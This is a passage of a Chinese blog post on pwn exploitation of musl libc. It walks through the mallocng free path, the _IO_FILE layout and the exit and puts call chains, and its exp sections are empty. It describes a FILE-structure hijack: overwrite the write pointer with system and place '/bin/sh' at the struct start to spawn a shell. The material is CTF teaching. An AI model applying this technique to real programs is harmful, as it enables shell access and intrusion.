<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line"><span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="type">uintptr_t</span>) (start - <span class="number">1</span>) ^ (<span class="type">uintptr_t</span>) end) &gt;= <span class="number">2</span> * PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>) start &amp; (PGSZ - <span class="number">1</span>));</span><br><span class="line">    <span class="type">size_t</span> len = (end - base) &amp; -PGSZ;</span><br><span class="line">    <span class="keyword">if</span> (len) &#123;</span><br><span class="line">        <span class="type">int</span> e = errno;</span><br><span class="line">        madvise(base, len, MADV_FREE);</span><br><span class="line">        errno = e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果加上将要释放的 <code>chunk</code> 该 <code>group</code> 中的所有 <code>chunk</code> 要么被释放要么空闲则跳出循环，否则更新 <code>freed_mask</code> 并返回。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">    <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">    <span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">    assert(!(mask &amp; self));</span><br><span class="line">    <span class="keyword">if</span> (!freed || mask + self == all) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (!MT)</span><br><span class="line">        g-&gt;freed_mask = freed + self;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed + self) != freed)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果跳出循环则会调用 <code>nontrivial_free</code> 释放 <code>group</code> 并返回需要 <code>munmap</code> 的内存的起始地址和大小，之后调用 <code>munmap</code> 释放这块内存。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">if</span> (mi.len) &#123;</span><br><span class="line">    <span class="type">int</span> e = errno;</span><br><span class="line">    munmap(mi.base, mi.len);</span><br><span class="line">    errno = e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="nontrivial-free"><a href="#nontrivial-free" class="headerlink" title="nontrivial_free"></a>nontrivial_free</h3><p>如果加上将要释放的 <code>chunk</code> 该 <code>group</code> 中的所有 <code>chunk</code> 要么被释放要么空闲并且 <code>group</code> 是可以释放的则首先判断 <code>meta</code> 是否在 active 这个 deque 中，如果在的话会将该 <code>meta</code> 从 deque 中取出。如果取出这个操作改变了 <code>active</code> 指针则将 <code>active</code> 当前指向的 <code>meta</code> 对应的 <code>group</code> 中的 <code>chunk</code> 调用 <code>activate_group</code> 函数激活。之后调用 <code>free_group</code> 将 <code>chunk</code> 所在的 <code>group</code> 释放并返回需要 <code>munmap</code> 的内存。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span> &lt;&lt; i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask + self == (<span class="number">2u</span> &lt;&lt; g-&gt;last_idx) - <span class="number">1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">    <span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">    <span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">    <span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="type">int</span> activate_new = (ctx.active[sc] == g);</span><br><span class="line">        dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">        <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">            activate_group(ctx.active[sc]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>如果该 <code>chunk</code> 所在的 <code>meta</code> 既没有释放的 <code>chunk</code> 也没有空闲的 <code>chunk</code> 则将该 <code>meta</code> 加入到 <code>active</code> 中。最后更新 <code>freed_mask</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">    assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">    <span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">    <span class="comment">// after last available slot was taken.</span></span><br><span class="line">    <span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">        <span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure></div>

<h3 id="free-group"><a href="#free-group" class="headerlink" title="free_group"></a>free_group</h3><p>首先更新 <code>usage_by_class</code> 。如果 <code>group</code> 是 mmap 得到的则返回 <code>group</code> 对应内存，否则调用 <code>nontrivial_free</code> 释放 <code>group</code> 所在的 <code>chunk</code> 。之后将 <code>meta</code> 释放。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">        ctx.usage_by_class[sc] -= g-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">        step_seq();</span><br><span class="line">        record_seq(sc);</span><br><span class="line">        mi.base = g-&gt;mem;</span><br><span class="line">        mi.len = g-&gt;maplen * <span class="number">4096UL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">        <span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">        g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">        mi = nontrivial_free(m, idx);</span><br><span class="line">    &#125;</span><br><span class="line">    free_meta(g);</span><br><span class="line">    <span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>group</code> 可以被释放的条件如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">okay_to_free</span><span class="params">(<span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!g-&gt;freeable) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// always free individual mmaps not suitable for reuse</span></span><br><span class="line">    <span class="keyword">if</span> (sc &gt;= <span class="number">48</span> || get_stride(g) &lt; UNIT * size_classes[sc])</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// always free groups allocated inside another group&#x27;s slot</span></span><br><span class="line">    <span class="comment">// since recreating them should not be expensive and they</span></span><br><span class="line">    <span class="comment">// might be blocking freeing of a much larger group.</span></span><br><span class="line">    <span class="keyword">if</span> (!g-&gt;maplen) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if there is another non-full group, free this one to</span></span><br><span class="line">    <span class="comment">// consolidate future allocations, reduce fragmentation.</span></span><br><span class="line">    <span class="keyword">if</span> (g-&gt;next != g) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free any group in a size class that&#x27;s not bouncing</span></span><br><span class="line">    <span class="keyword">if</span> (!is_bouncing(sc)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> cnt = g-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">    <span class="type">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if usage is high enough that a larger count should be</span></span><br><span class="line">    <span class="comment">// used, free the low-count group so a new one will be made.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">9</span> * cnt &lt;= usage &amp;&amp; cnt &lt; <span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// otherwise, keep the last group in a bouncing class.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="堆利用-1"><a href="#堆利用-1" class="headerlink" title="堆利用"></a>堆利用</h2><h3 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink"></a>unlink</h3><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="IO-FILE-利用-1"><a href="#IO-FILE-利用-1" class="headerlink" title="IO_FILE 利用"></a>IO_FILE 利用</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> // <span class="title">sizeof</span>=</span><span class="number">0xE8</span></span><br><span class="line"><span class="number">00000000</span> &#123;                                       <span class="comment">// XREF: FILE/r _IO_FILE_0/r</span></span><br><span class="line"><span class="number">00000000</span>     <span class="type">unsigned</span> <span class="type">int</span> flags;                 <span class="comment">// XREF: gets+C4/r</span></span><br><span class="line"><span class="number">00000004</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000005</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000006</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000007</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000008</span>     <span class="type">unsigned</span> __int8 *rpos;              <span class="comment">// XREF: locking_getc_1+54/r</span></span><br><span class="line"><span class="number">00000008</span>                                         <span class="comment">// locking_getc_1:loc_848A8/w ...</span></span><br><span class="line"><span class="number">00000010</span>     <span class="type">unsigned</span> __int8 *rend;              <span class="comment">// XREF: locking_getc_1+58/r</span></span><br><span class="line"><span class="number">00000010</span>                                         <span class="comment">// locking_getc_1+C4/r ...</span></span><br><span class="line"><span class="number">00000018</span>     <span class="type">int</span> (*close)(FILE *);</span><br><span class="line"><span class="number">00000020</span>     <span class="type">unsigned</span> __int8 *wend;              <span class="comment">// XREF: locking_putc_1+70/r</span></span><br><span class="line"><span class="number">00000020</span>                                         <span class="comment">// putchar+68/r ...</span></span><br><span class="line"><span class="number">00000028</span>     <span class="type">unsigned</span> __int8 *wpos;              <span class="comment">// XREF: locking_putc_1+6C/r</span></span><br><span class="line"><span class="number">00000028</span>                                         <span class="comment">// locking_putc_1+7C/w ...</span></span><br><span class="line"><span class="number">00000030</span>     <span class="type">unsigned</span> __int8 *mustbezero_1;</span><br><span class="line"><span class="number">00000038</span>     <span class="type">unsigned</span> __int8 *wbase;</span><br><span class="line"><span class="number">00000040</span>     <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> __int8 *, <span class="type">size_t</span>);</span><br><span class="line"><span class="number">00000048</span>     <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> __int8 *, <span class="type">size_t</span>);</span><br><span class="line"><span class="number">00000050</span>     <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="number">00000058</span>     <span class="type">unsigned</span> __int8 *buf;</span><br><span class="line"><span class="number">00000060</span>     <span class="type">size_t</span> buf_size;</span><br><span class="line"><span class="number">00000068</span>     FILE *prev;</span><br><span class="line"><span class="number">00000070</span>     FILE *next;</span><br><span class="line"><span class="number">00000078</span>     <span class="type">int</span> fd;</span><br><span class="line"><span class="number">0000007</span>C     <span class="type">int</span> pipe_pid;</span><br><span class="line"><span class="number">00000080</span>     __int64 lockcount;</span><br><span class="line"><span class="number">00000088</span>     <span class="type">int</span> mode;                           <span class="comment">// XREF: psignal+74/r</span></span><br><span class="line"><span class="number">00000088</span>                                         <span class="comment">// psignal:loc_7E130/w ...</span></span><br><span class="line"><span class="number">0000008</span>C     <span class="keyword">volatile</span> <span class="type">int</span> lock;                  <span class="comment">// XREF: __getopt_msg+48/r</span></span><br><span class="line"><span class="number">0000008</span>C                                         <span class="comment">// psignal+48/r ...</span></span><br><span class="line"><span class="number">00000090</span>     <span class="type">int</span> lbf;                            <span class="comment">// XREF: locking_putc_1+5C/r</span></span><br><span class="line"><span class="number">00000090</span>                                         <span class="comment">// locking_putc_1+FC/r ...</span></span><br><span class="line"><span class="number">00000094</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000095</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000096</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000097</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000098</span>     <span class="type">void</span> *cookie;</span><br><span class="line"><span class="number">000000</span>A0     <span class="type">off_t</span> off;</span><br><span class="line"><span class="number">000000</span>A8     <span class="type">char</span> *getln_buf;</span><br><span class="line"><span class="number">000000B</span>0     <span class="type">void</span> *mustbezero_2;</span><br><span class="line"><span class="number">000000B</span>8     <span class="type">unsigned</span> __int8 *shend;</span><br><span class="line"><span class="number">000000</span>C0     <span class="type">off_t</span> shlim;</span><br><span class="line"><span class="number">000000</span>C8     <span class="type">off_t</span> shcnt;</span><br><span class="line"><span class="number">000000</span>D0     FILE *prev_locked;</span><br><span class="line"><span class="number">000000</span>D8     FILE *next_locked;</span><br><span class="line"><span class="number">000000E0</span>     __locale_struct *locale;            <span class="comment">// XREF: psignal+6C/r</span></span><br><span class="line"><span class="number">000000E0</span>                                         <span class="comment">// psignal+B8/w ...</span></span><br><span class="line"><span class="number">000000E8</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="number">000000E8</span> <span class="keyword">typedef</span> _IO_FILE _IO_FILE_0;            <span class="comment">// XREF: FILE_0/r</span></span><br></pre></td></tr></table></figure></div>

<h3 id="exit-调用链-1"><a href="#exit-调用链-1" class="headerlink" title="exit 调用链"></a>exit 调用链</h3><p>分析 <code>exit</code> 函数的调用链，发现最终会调用</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="keyword">volatile</span> __stdin_used = &amp;__stdin_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stdout_used = &amp;__stdout_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stderr_used = &amp;__stderr_FILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">    __funcs_on_exit();</span><br><span class="line">    __libc_exit_fini();</span><br><span class="line">    __stdio_exit();</span><br><span class="line">    _Exit(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>) &#123;</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">for</span> (f = *__ofl_lock(); f; f = f-&gt;next) close_file(f);</span><br><span class="line">    close_file(__stdin_used);</span><br><span class="line">    close_file(__stdout_used);</span><br><span class="line">    close_file(__stderr_used);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">    FFINALLOCK(f);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos - f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到 <code>close_file</code> 中可能会调用三个 FILE 的 <code>write</code> 和 <code>seek</code> 函数指针。我们要修改的也正是这两个指针。在没有沙箱的情况下，只需要将 FILE 结构体开头的几个字节修改为 <code>/bin/sh</code> ，再修改 <code>write</code> 指针的值为 <code>system</code> ，以及修改 <code>f-&gt;wpos</code> 、<code>f-&gt;wbase</code> 中其中之一就可以调用到 <code>system(&quot;/bin/sh&quot;)</code> 。</p>
<p>总结来说，就是在无沙箱时，需要修改 <code>_IO_FILE</code> 结构体的几个地方：</p>
<ul>
<li>起始位置写入 <code>/bin/sh</code></li>
<li><code>f-&gt;wpos</code> 、<code>f-&gt;wbase</code> 中其中之一使得二者不等</li>
<li><code>write</code> 写入 <code>system</code> 函数地址。</li>
<li>最好将 <code>lock</code> 设置为小于 0 避免程序卡死在 <code>__lockfile</code> 函数中。（等于 0 貌似也可以）</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FFINALLOCK(f);</span><br><span class="line"><span class="comment">//定义:  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FFINALLOCK(f) ((f)-&gt;lock &gt;= 0 ? __lockfile((f)) : 0)</span></span><br><span class="line"><span class="comment">//替换:  </span></span><br><span class="line">((f)-&gt;lock &gt;= <span class="number">0</span> ? __lockfile((f)) : <span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="puts-调用链-1"><a href="#puts-调用链-1" class="headerlink" title="puts 调用链"></a>puts 调用链</h3><p> 分析 <code>puts</code> 函数的调用链，发现最终会调用</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    FLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    r = -(<span class="built_in">fputs</span>(s, <span class="built_in">stdout</span>) &lt; <span class="number">0</span> || putc_unlocked(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) &lt; <span class="number">0</span>);</span><br><span class="line">    FUNLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> l = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">return</span> (fwrite(s, <span class="number">1</span>, l, f) == l) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *<span class="keyword">restrict</span> src, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> k, l = size * nmemb;</span><br><span class="line">    <span class="keyword">if</span> (!size) nmemb = <span class="number">0</span>;</span><br><span class="line">    FLOCK(f);</span><br><span class="line">    k = __fwritex(src, l, f);</span><br><span class="line">    FUNLOCK(f);</span><br><span class="line">    <span class="keyword">return</span> k == l ? nmemb : k / size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __towrite(FILE *f) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;flags &amp; F_NOWR) &#123;</span><br><span class="line">        f-&gt;flags |= F_ERR;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> __fwritex(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">size_t</span> l, FILE *<span class="keyword">restrict</span> f) &#123;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!f-&gt;wend &amp;&amp; __towrite(f)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l &gt; f-&gt;wend - f-&gt;wpos) <span class="keyword">return</span> f-&gt;write(f, s, l);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3>
		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> 深入理解Pwn_musl及相关例题</li>
        <li><strong>Author:</strong> 韩乔落</li>
        <li><strong>Created at
                :</strong> 2024-12-13 10:45:23</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-12-11 18:51:44
            </li>
        
        <li>
            <strong>Link:</strong> https://jelasin.github.io/2024/12/13/深入理解Pwn_musl及相关例题/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2024/12/13/Syzkaller%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E5%92%8C%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Syzkaller源码分析和使用技巧</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
